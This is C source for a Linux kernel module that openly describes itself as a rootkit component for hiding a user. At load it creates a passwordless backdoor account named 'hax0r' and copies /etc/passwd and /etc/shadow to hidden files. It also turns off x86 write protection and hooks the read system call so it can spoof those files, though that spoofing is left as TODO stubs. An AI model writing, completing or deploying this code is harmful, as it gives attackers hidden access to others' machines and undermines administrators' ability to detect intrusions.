#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/umh.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hides a user in the etc/passwd and etc/shadow files");

static unsigned long *sys_call_table;
static typeof(sys_read) *actual_open;

/**
 * So that we can return a pathname and its kernel page from 1 function.
 */
typedef struct PathData
{
    char *path_name;
    char *tmp_loc;
} PathData;

/**
 * For (allows) x86 system writing
 */
#define CR0_WRITE_UNLOCK(x)                      \
    do                                           \
    {                                            \
        unsigned long __cr0;                     \
        preempt_disable();                       \
        __cr0 = read_cr0() & (~X86_CR0_WP);      \
        BUG_ON(unlikely(__cr0 &X86_CR0_WP));     \
        write_cr0(__cr0);                        \
        x;                                       \
        __cr0 = read_cr0() | X86_CR0_WP;         \
        BUG_ON(unlikely(!(__cr0 & X86_CR0_WP))); \
        write_cr0(__cr0);                        \
        preempt_enable();                        \
    } while (0)

/**
 * Creates a temporary fd for the given file
 */
void create_temp_fd(char *file)
{
    char *envp[] = {"HOME=/", NULL};

    // NOTE: probably want to hide these files with the "ls" part of the rootkit
    char *argv[] = {"/bin/cp", "/etc/passwd", "/etc/.fakepasswd", NULL};

    printk(KERN_INFO "attempting to duplicate/create fake files\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy passwd\n");
    }
}

/**
 * Create old (fake) passwd & shadow file
 * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
 */
void create_fake_files(void)
{
    char *envp[] = {"HOME=/", NULL};

    // NOTE: probably want to hide these files with the "ls" part of the rootkit
    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/.fakepasswd", NULL};
    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/.fakeshadow", NULL};

    printk(KERN_INFO "attempting to duplicate/create fake files\n");

    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy passwd\n");
    }

    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy shadow\n");
    }
}

/**
 * Create the backdoor user, which would be hidden while module is loaded
 */
void create_backdoor_user(void)
{
    char *envp[] = {"HOME=/", NULL};

    // add "-p" followed by a hashed password to specify a password.
    // currently, anyone can login to the account without a password.
    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};

    printk(KERN_INFO "attempting to create hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to create backdoor user\n");
    }
}

/**
 * Removes the backdoor user
 */
void remove_backdoor_user(void)
{
    char *envp[] = {"HOME=/", NULL};
    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};

    printk(KERN_INFO "attempting to create hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC))
    {
        printk(KERN_INFO "unable to remove backdoor user\n");
    }
}

/**
 * Get the full path from a given fd
 */
void set_path_from_fd(int fd, PathData *data)
{
    // parse the file path from the current fd
    char *tmp_loc;
    char *path_name;
    struct file *tmp_file;
    struct path *tmp_path;

    tmp_file = fget(fd);
    if (!tmp_file)
    {
        printk(KERN_INFO "unable to get file struct ptr from fd\n");

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        return;
    }

    tmp_path = &tmp_file->f_path;
    path_get(tmp_path);

    // get a free mem page to store the path in
    tmp_loc = (char *)__get_free_page(GFP_KERNEL);
    if (!tmp_loc)
    {
        printk(KERN_INFO "unable to get free page of kernel memory for buffering path_name\n");

        // put to buff
        path_put(tmp_path);

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        // free the page here, b/c callee function only free's if this function was successful
        free_page((unsigned long)tmp_loc);

        return;
    }

    path_name = d_path(tmp_path, tmp_loc, PAGE_SIZE);
    path_put(tmp_path);

    // reached error with the pathname
    if (IS_ERR(path_name))
    {
        printk(KERN_INFO "error pathname return\n");

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        // free the page here, b/c callee function only free's if this function was successful
        free_page((unsigned long)tmp_loc);

        return;
    }

    // printk(KERN_INFO "valid pathname return\n");
    // reached - hence a valid file/path was parsed from a fd.
    data->path_name = path_name;
    data->tmp_loc = tmp_loc;

    return;
}

/**
 * Spoof reader event handler
 */
static asmlinkage long hooked_spoof_read(int fd, char __user *buf, size_t size)
{
    // set the pathname from the fd
    PathData data_ptr;
    data_ptr.tmp_loc = NULL; // preset this to null just-incase...
    set_path_from_fd(fd, &data_ptr);

    // reaches block if there was an error reading the filepath from the fd
    if (data_ptr.tmp_loc == NULL)
    {
        printk(KERN_INFO "null tmp_loc so return real file");

        return actual_open(fd, buf, size);
    }

    // got a file_path - determine if it's what we want.
    // determine whether pathname is a file we spoofed
    if (strcmp(data_ptr.path_name, "/etc/passwd") == 0)
    {
        printk(KERN_INFO "reading passwd file\n");

        // cleanup allocated kernel page
        if (data_ptr.tmp_loc != NULL)
        {
            free_page((unsigned long)data_ptr.tmp_loc);
        }

        // TODO:
        // set the fd to the old file
        //old_f = sys_open("/etc/.fakepasswd", O_RDWR, 00400);

        return actual_open(fd, buf, size);
    }
    else if (strcmp(data_ptr.path_name, "/etc/shadow") == 0)
    {
        printk(KERN_INFO "reading shadow file\n");

        // cleanup allocated kernel page
        if (data_ptr.tmp_loc != NULL)
        {
            free_page((unsigned long)data_ptr.tmp_loc);
        }

        // TODO:

        return actual_open(fd, buf, size);
    }

    // cleanup allocated kernel page
    free_page((unsigned long)data_ptr.tmp_loc);

    return actual_open(fd, buf, size);
}

/**
 * Initialize the module
 */
static int __init init_mod(void)
{
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

    if (sys_call_table == NULL)
    {
        printk(KERN_ERR "unable to get sys_call_table\n");

        return -1;
    }

    // create the fake files
    create_fake_files();

    // create the hacker user
    create_backdoor_user();

    // allow writing on x86
    CR0_WRITE_UNLOCK({
        actual_open = (typeof(sys_read) *)sys_call_table[__NR_read];

        printk(KERN_INFO "actual_open at %p\n", actual_open);

        sys_call_table[__NR_read] = (void *)&hooked_spoof_read;
    });

    printk(KERN_INFO "init successful\n");

    return 0;
}

/**
 * Cleanup the module
 */
static void __exit cleanup_mod(void)
{
    remove_backdoor_user();

    CR0_WRITE_UNLOCK({
        sys_call_table[__NR_read] = (void *)actual_open;
    });

    printk(KERN_INFO "cleanup successful\n");
}

/**
 * init/exit
 */
module_init(init_mod);
module_exit(cleanup_mod);
